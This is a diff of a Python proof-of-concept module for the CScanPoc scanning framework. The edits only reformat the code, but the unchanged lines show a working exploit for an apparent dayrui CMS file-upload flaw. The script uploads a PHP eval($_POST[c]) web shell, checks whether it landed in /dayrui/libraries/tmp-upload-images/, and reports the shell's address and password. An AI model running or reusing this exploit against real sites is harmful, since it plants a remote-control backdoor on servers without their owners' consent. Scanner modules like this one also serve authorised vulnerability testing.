@@ -2,7 +2,9 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.error
+import urllib.parse
 import random
 
 
@@ -25,14 +27,16 @@ class Vuln(ABVuln):
 
 def verifyShell(target, fileName):
     url = target + "?name=" + fileName
-    req = urllib.request.Request(url, headers={"Content-Type": "application/oct"})
+    req = urllib.request.Request(
+        url, headers={"Content-Type": "application/oct"})
     res = urllib.request.urlopen(req, data="<?print(md5(0x22))?>")
     return res.read()
 
 
 def uploadShell(target, fileName):
     url = target + "?name=" + fileName
-    req = urllib.request.Request(url, headers={"Content-Type": "application/oct"})
+    req = urllib.request.Request(
+        url, headers={"Content-Type": "application/oct"})
     res = urllib.request.urlopen(
         req, data="<?print(md5(0x22));<?php eval($_POST[c])?>")
     return res.read()
@@ -57,9 +61,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -77,7 +82,7 @@ class Poc(ABPoc):
             url = self.target + "/dayrui/libraries/tmp-upload-images/" + fileName
             md5 = urllib.request.urlopen(url).read()
             if md5.find("e369853df766fa44e1ed0ff613f563bd") != -1:
-                #print "poc: " + url
+                # print "poc: " + url
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -85,7 +90,8 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -103,7 +109,7 @@ class Poc(ABPoc):
             url = self.target + "/dayrui/libraries/tmp-upload-images/" + fileName
             md5 = urllib.request.urlopen(url).read()
             if md5.find("e369853df766fa44e1ed0ff613f563bd") != -1:
-                #print "poc: " + url
+                # print "poc: " + url
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                     target=self.target, name=self.vuln.name))
 
